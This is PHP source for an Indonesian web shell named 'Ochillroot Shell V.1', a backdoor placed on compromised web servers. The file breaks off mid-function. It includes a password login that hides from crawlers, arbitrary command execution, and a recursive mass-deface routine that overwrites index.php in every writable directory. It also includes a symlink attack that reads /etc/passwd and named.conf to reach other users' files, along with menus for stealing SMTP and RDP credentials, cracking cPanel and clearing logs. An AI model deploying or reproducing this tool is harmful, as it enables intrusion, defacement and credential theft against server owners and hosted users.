<?php /*
* Ochillroot Shell V.1
* "+---------------------------------------------------+"
* | Coded : by VALENS1A |"
* | Name Shell : Ochillroot Shell V.1 |"
* | Rilis : 01 - 03 - 2017 / 14:32 WIB |"
* | Copyright : IndoXploit - Ochill_Bintang |"
* +----------------------------------------------------+"
* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
/* ----------------------------------------------------- */

session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "67ad9a5b42d94df90935b57ea6a1b0e3"; // Default Psswordnya Mas: IDTT2017 by VALENS1A
$color = "aqua";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
header('HTTP/1.0 404 Not Found');
exit;
}
}

function login_shell() {
?>
<html>
<!-- ****************************** : ****************************** -->
<iframe width="0" height="0" src="https://www.youtube.com/embed/-dE8zrDxVps?autoplay=1" frameborder="0" allowfullscreen></iframe>
<!-- ****************************** : ****************************** -->
<head>
<link rel="shortcut icon" type="image/x-icon" href="http://www.fancyicons.com/free-icons/103/flags/png/48/indonesia_flag_48.png"><script language="JavaScript">function tb5_makeArray(n){ this.length = n; return this.length;



}



tb5_messages = new tb5_makeArray(2);



tb5_messages[0] = "./OchillRoot | VALENS1A";



tb5_messages[1] = "..::[+ Ochillroot Mini Shell v.01 +]::..";



tb5_rptType = 'infinite';



tb5_rptNbr = 100;



tb5_speed = 200;



tb5_delay = 50;



var tb5_counter=1;



var tb5_currMsg=0;



var tb5_stsmsg="";



function tb5_shuffle(arr){



var k;



for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;



}



return arr;



}



tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";



}



tb5_arr = tb5_shuffle(tb5_arr);



function tb5_init(n){



var k;



if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;



}



else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);



}



function tb5_randomizetitle(){ tb5_init(0);



}



tb5_randomizetitle();</script>
<style type="text/css">
html {
margin: 20px auto;
cursor:url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;
background:#121214 url(https://static.alphacoders.com/desktops/5243.jpg) no-repeat center center fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
color: aqua;
text-align: center;
}
header {
color: aqua;
margin: 10px auto;
}
input[type=password] {
width: 250px;
height: 25px;
color: aqua;
background: rgba(0,225,0,00);
border: 1px dotted #000;
padding: 5px;
text-align: center;
}

</style>
</head>
<center>
<header>
</header>
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
@ob_clean();
$file = $_GET['file'];
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
readfile($file);
exit;
}
?>
<html>
<head>
<link rel="shortcut icon" type="image/x-icon" href="http://www.fancyicons.com/free-icons/103/flags/png/48/indonesia_flag_48.png"><script language="JavaScript">function tb5_makeArray(n){ this.length = n; return this.length;



}



tb5_messages = new tb5_makeArray(2);



tb5_messages[0] = "./OchillRoot | VALENS1A";



tb5_messages[1] = "..::[+ OchillRoot Mini Shell V.01 +]::..";



tb5_rptType = 'infinite';



tb5_rptNbr = 100;



tb5_speed = 200;



tb5_delay = 50;



var tb5_counter=1;



var tb5_currMsg=0;



var tb5_stsmsg="";



function tb5_shuffle(arr){



var k;



for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;



}



return arr;



}



tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";



}



tb5_arr = tb5_shuffle(tb5_arr);



function tb5_init(n){



var k;



if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;



}



else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);



}



function tb5_randomizetitle(){ tb5_init(0);



}



tb5_randomizetitle();</script>
<meta name='author' content='IndoXploit | OchillRoot | VALENS1A | Annanda H4x0r | Semua defacer yang ada di IDTT'>
<meta charset="UTF-8">
<style type='text/css'>
html {
cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;
background:#121214 url(https://static.alphacoders.com/desktops/5243.jpg) no-repeat center center fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
color: white;
font-family: 'Ubuntu';
font-size: 13px;
width: 100%;
}
li {
display: inline;
margin: 5px;
padding: 5px;
}
table, th, td {
border-collapse:collapse;
font-family: Tahoma, Geneva, sans-serif;
background: transparent;
font-family: 'Ubuntu';
font-size: 13px;
}
.table_home, .th_home, .td_home {
border: 1px solid white;
}
th {
padding: 10px;
}
a {
color: aqua;
text-decoration: none;
}
a:hover {
color: gold;
text-decoration: underline;
}
b {
color: gold;
}
input[type=text], input[type=password],input[type=submit] {
background: transparent;
color: aqua;
border: 1px solid aqua;
margin: 5px auto;
padding-left: 5px;
font-family: 'Ubuntu';
font-size: 13px;
}
hr {
border : 0;
height : 1px;
background-image : linear-gradient(to right, rgba(0, 0, 0, 0), rgb(0,255,255), rgba(0, 0, 0, 0))
}
textarea {
border: 1px solid aqua;
width: 100%;
height: 400px;
padding-left: 5px;
margin: 10px auto;
resize: none;
background: transparent;
color: aqua;
font-family: 'Ubuntu';
font-size: 13px;
}
select {
width: 152px;
background: rgba(0,225,0,00);
color: aqua;
border: 1px solid white;
margin: 5px auto;
padding-left: 5px;
font-family: 'Ubuntu';
font-size: 13px;
}
option:hover {
background: lime;
color: #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}

</style>
<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
<style>
/*NoScript*/
#enjs {z-index: 999;position:fixed;top:0;left:0;width:100%;height:100%;background-color:#000;margin:0;padding:0;}
#enjs p {margin:0;padding:0;width:100%;color:#333;position:relative;top:40%;font:bold 18px/20px arial;text-align:center;text-shadow:none;}
/*ScrollBar */
::-webkit-scrollbar {width: 12px;}
::-webkit-scrollbar-track {background:rgb(71, 71, 71);}
::-webkit-scrollbar-thumb, ::-webkit-scrollbar-thumb:window-inactive { background: rgb(34, 34, 34); }
#loading-overlay {position:fixed;top:0;left:0;right:0;bottom:0;background:#000000;z-index:999999;text-align:center;width:100%;height:100%;padding-top:22%;color:Darkviolet;}
.ball {background-color: transparent;border:5px solid rgb(240 ,0 , 0);border-right:5px solid transparent;border-left:5px solid transparent;border-radius:50px;box-shadow: 0 0 35px rgb(255 ,0 , 0);width:50px;height:50px;margin:0 auto;-moz-animation:spinPulse 1s infinite ease-in-out;-webkit-animation:spinPulse 1s infinite linear;}
.ball1 {background-color: transparent;border:5px solid rgb(240 ,0 , 0);border-left:5px solid transparent;border-right:5px solid transparent;border-radius:50px;box-shadow: 0 0 15px rgb(255 ,0 , 0);width:30px;height:30px;margin:0 auto;position:relative;top:-50px;-moz-animation:spinoffPulse 1s infinite linear;-webkit-animation:spinoffPulse 1s infinite linear;}
@-moz-keyframes spinPulse {0% { -moz-transform:rotate(160deg); opacity:0; box-shadow:0 0 1px rgb(255, 0, 0)}50% { -moz-transform:rotate(145deg); opacity:1; }100% { -moz-transform:rotate(-320deg); opacity:0; }}
@-moz-keyframes spinoffPulse {0% { -moz-transform:rotate(0deg); } 100% { -moz-transform:rotate(360deg); }}
@-webkit-keyframes spinPulse {0% { -webkit-transform:rotate(160deg); opacity:0; box-shadow:0 0 1px rgb(255, 0, 0)} 50% { -webkit-transform:rotate(145deg); opacity:1;} 100% { -webkit-transform:rotate(-320deg); opacity:0; }}
@-webkit-keyframes spinoffPulse {0% { -webkit-transform:rotate(0deg); } 100% { -webkit-transform:rotate(360deg); }}
</style>
</head>
<body>
<div id="loading-overlay">
<div class="ball"></div>
<div class="ball1"></div>
<h3>Tunggu sebentar,.... Masih Proses Loading..............</h3>
</div>
<script>
// hilangkan overlay dengan efek .fadeOut() jika keseluruhan halaman telah selesai dimuat
$(window).bind("load", function() {
$("#loading-overlay").fadeOut();
});
</script>
<br /><br />
</body>
</html>
<?php
function w($dir,$perm) {
if(!is_writable($dir)) {
return "<font color=red>".$perm."</font>";
} else {
return "<font color=lime>".$perm."</font>";
}
}
function r($dir,$perm) {
if(!is_readable($dir)) {
return "<font color=red>".$perm."</font>";
} else {
return "<font color=lime>".$perm."</font>";
}
}
function exe($cmd) {
if(function_exists('system')) {
@ob_start();
@system($cmd);
$buff = @ob_get_contents();
@ob_end_clean();
return $buff;
} elseif(function_exists('exec')) {
@exec($cmd,$results);
$buff = "";
foreach($results as $result) {
$buff .= $result;
} return $buff;
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cmd);
$buff = @ob_get_contents();
@ob_end_clean();
return $buff;
} elseif(function_exists('shell_exec')) {
$buff = @shell_exec($cmd);
return $buff;
}
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
if(strpos($param, $kata1) === FALSE) return FALSE;
if(strpos($param, $kata2) === FALSE) return FALSE;
$start = strpos($param, $kata1) + strlen($kata1);
$end = strpos($param, $kata2, $start);
$return = substr($param, $start, $end - $start);
return $return;
}
function getsource($url) {
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
$content = curl_exec($curl);
curl_close($curl);
return $content;
}
function bing($dork) {
$npage = 1;
$npages = 30000;
$allLinks = array();
$lll = array();
while($npage <= $npages) {
$x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
if($x) {
preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
$npage = $npage + 10;
if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
} else break;
}
$URLs = array();
foreach($allLinks as $url){
$exp = explode("/", $url);
$URLs[] = $exp[2];
}
$array = array_filter($URLs);
$array = array_unique($array);
$sss = count(array_unique($array));
foreach($array as $domain) {
echo $domain."\n";
}
}
function reverse($url) {
$ch = curl_init("http://domains.yougetsignal.com/domains.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$url&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",", str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
foreach($array as $lnk) {
$lnk = "http://$lnk";
$lnk = str_replace(",", "", $lnk);
echo $lnk."\n";
ob_flush();
flush();
}
curl_close($ch);
}
if(get_magic_quotes_gpc()) {
function idx_ss($array) {
return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
}
$_POST = idx_ss($_POST);
$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
$dir = $_GET['dir'];
chdir($dir);
} else {
$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$wget = (exe('wget --help')) ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$perl = (exe('perl --help')) ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$python = (exe('python --help')) ? "<font color=lime>HIDUP</font>" : "<font color=red>MATI</font>";
$show_ds = (!empty($ds)) ? "<font color=lime>$ds</font>" : "<font color=red>KOSONG</font>";
$portkontlo = $_SERVER['SERVER_PORT'];
if(!function_exists('posix_getegid')) {
$user = @get_current_user();
$uid = @getmyuid();
$gid = @getmygid();
$group = "?";
} else {
$uid = @posix_getpwuid(posix_geteuid());
$gid = @posix_getgrgid(posix_getegid());
$user = $uid['name'];
$uid = $uid['uid'];
$group = $gid['name'];
$gid = $gid['gid'];
}
echo '<font>
<center>
<table style="background:# " border="1"><tr>
<th style="background:blink;">
<!--by ochill-->

<br>
<font color\"aqua\"="" size="\&quot;5\&quot;"> ..::[+ OchillRoot Mini Shell V.01 +]::.. </font>
<br> <br>
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;"><div class="cont"><br>
<style>

body,table{background: ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color: ; color: aqua;}

.inputzbut:hover{border:1px solid white;}
</style>';
echo '<span align="left">';
echo "<ul>";
echo "<li><br><font color=white>
System : <font color=lime>".$kernel."</font></li><br>
User : <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>
Server IP : <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>
HDD : <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>
Safe Mode : $sm<br>
Port : <font color=lime> $portkontlo </font><br>
MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </font><br></li>";
echo "</ul><hr><ul>";
echo "<li>[ <a style='color: lime;' href='?'> Home </a> ]</li>";
echo "<li>[ <a style='color: lime;' href='?dir=$dir&ochill_valens1a=valens1a'> About </a> ]</li>";
echo "<li>[ <a style='color: red;' href='?logout=true'> Metu </a> ]</li>";
echo "</ul>";
echo "</span>";
echo "<center>
..::[+
[ <a href='?dir=$dir&ochill_valens1a=upload'> Upload </a> ]
[ <a href='?dir=$dir&ochill_valens1a=cmd'> Dolanan CMD </a> ]
[ <a href='?dir=$dir&ochill_valens1a=config'> Config </a> ]
[ <a href='?dir=$dir&ochill_valens1a=jumping'> Ngolek Kamar </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valen_defacemassal'> Deface Massal </a> ]
[ <a href='?dir=$dir&ochill_valens1a=mass_delete'> Busek Massal </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_mainsabun'> Sabuner </a> ]
+]::..
<br /><br />
..::[+
[ <a href='?dir=$dir&ochill_valens1a=smtp'> Nyolong SMTP </a> ]
[ <a href='?dir=$dir&ochill_valens1a=krdp_shell'> Nyolong RDP </a> ]
[ <a href='?dir=$dir&ochill_valens1a=adminer'> Mbobol Kamar </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_logclr'> Golek Log </a> ]
[ <a href='?dir=$dir&ochill_valens1a=cgi'> Telnet </a> ]
[ <a href='?dir=$dir&ochill_valens1a=network'> Jaringan </a> ]
[ <a href='?dir=$dir&ochill_valens1a=fake_root'> Fake Root </a> ]
+]::..
<br /><br />
..::[+
[ <a href='?dir=$dir&ochill_valens1a=auto_edit_user'> Auto Pacaki User </a> ]
[ <a href='?dir=$dir&ochill_valens1a=auto_wp'> Auto Pacaki Jeneng WP </a> ]
[ <a href='?dir=$dir&ochill_valens1a=auto_dwp'> WP Auto Deface </a> ]
[ <a href='?dir=$dir&ochill_valens1a=auto_dwp2'> WP Auto Deface V.2 </a> ]
[ <a href='?dir=$dir&ochill_valens1a=cpftp_auto'> CPanel/FTP Auto Deface </a> ]
+]::..
<br /><br />
..::[+
[ <a href='?dir=$dir&ochill_valens1a=cpanel'> Ngecrack Cpanel </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_sym'> Symlink </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1adecode'> Encode/Decode </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_ckshl'> Check Shell </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_shlglk'> Golek Shell </a> ]
[ <a href='?dir=$dir&ochill_valens1a=zoneh'> Zone-H </a> ]
[ <a href='?dir=$dir&ochill_valens1a=defacerid'> Defacer-Id </a> ]
[ <a href='?dir=$dir&ochill_valens1a=valens1a_zip'> Zip Karo Unzip </a> ]
[ <a style='color: red;' href='?dir=$dir&ochill_valens1a=valens1akill'> Busek Shell </a> ]
+]::..
</center>";
echo '<span align="left">';
echo "<hr><ul><li>
<font color=lime>Panggone Sempak: </font>";
foreach($scdir as $c_dir => $cdir) {
echo "<a href='?dir=";
for($i = 0; $i <= $c_dir; $i++) {
echo $scdir[$i];
if($i != $c_dir) {
echo "/";
}
}
echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]</li></ul></span>";
echo "<hr>";
if($_GET['logout'] == true) {
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
echo "<script>window.location='?';</script>";
} elseif($_GET['ochill_valens1a'] == 'valens1akill') {
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<center><br><center><h2>Shell sukses di busek</h2><br>Suwon wes tau gawe shell iki cok! Removed by V A L E N S 1 A.</center></center>');
else
echo '<center>Shell gagal di busek!</center>';
}elseif($_GET['ochill_valens1a'] == 'valen_defacemassal') {
function sabun_massal($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "[<font color=lime>MARI</font>] $lokasi<br>";
file_put_contents($lokasi, $isi_script);
$idx = sabun_massal($dirc,$namafile,$isi_script);
}
}
}
}
}
}
function sabun_biasa($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "[<font color=lime>MARI</font>] $dirb/$namafile<br>";
file_put_contents($lokasi, $isi_script);
}
}
}
}
}
}
if($_POST['start']) {
if($_POST['tipe_sabun'] == 'mahal') {
echo "<div style='margin: 5px auto; padding: 5px'>";
sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
echo "</div>";
} elseif($_POST['tipe_sabun'] == 'murah') {
echo "<div style='margin: 5px auto; padding: 5px'>";
sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
echo "</div>";
}
} else {
echo "<center>";
echo "<form method='post'>
<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
<font style='text-decoration: underline;'>Panggone Sempak:</font><br>
<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
<font style='text-decoration: underline;'>Jeneng Sempak:</font><br>
<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
<textarea name='script' style='width: 450px; height: 200px;'>VALENS1A MASS DEFACE | MA1N SABUN SEKAL1AN</textarea><br>
<input type='submit' name='start' value='Mass Deface'>
</form></center>";
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
}
}elseif($_GET['ochill_valens1a'] == 'valens1adecode') {
{$text = $_POST['code'];
?>
<center><font face=Comic Sans MS size='2' color=lime>WOCOEN SEK: </font><font face=Comic Sans MS size='2' color=white>Enteni sampek loadingane selesai cok => lek wes mari hasilne bakalan metu.</font>
<form method="post"><br><br><br>
<textarea class='inputz' cols=20 rows=5 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope">
<option value="base64">Base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>
<?php
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;default:break;}}

echo '<textarea cols=10 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><BR><BR>';
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
}
}elseif($_GET['ochill_valens1a'] == 'valens1a_sym') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("valens1a_smylink",0777);
@chdir("valens1a_smylink");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex valens1a.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/valens1a_smylink/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$valens1a=@file('/etc/passwd');
if ($valens1a){
@mkdir("valens1a_smylink",0777);
@chdir("valens1a_smylink");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex valens1a.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
@fclose($fp3);
echo "
<table align=center border=1><tr>
<td align=center><font size=3>S. No.</font></td>
<td align=center><font size=3>Users</font></td>
<td align=center><font size=3>Symlink</font></td></tr>";
$dcount = 1;
$file = fopen("/etc/passwd", "r") or exit("Gaisok Bukak Sempak!");
while(!feof($file)){
$s = fgets($file);
$matches = array();
$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
$matches = str_replace("home/","",$matches[1]);
if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
continue;
echo "<tr><td align=center><font size=2>" . $dcount . "</td>
<td align=center><font class=txt>" . $matches . "</td>";
echo "<td align=center><font class=txt><a href=$full/valens1a_smylink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
$dcount++;}fclose($file);
echo "</table>";}else{if($os != "Windows"){@mkdir("valens1a_smylink",0777);@chdir("valens1a_smylink");@exe("ln -s / root");$file3 = '
Options Indexes FollowSymLinks
DirectoryIndex valens1a.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
$fp3 = fopen('.htaccess','w');
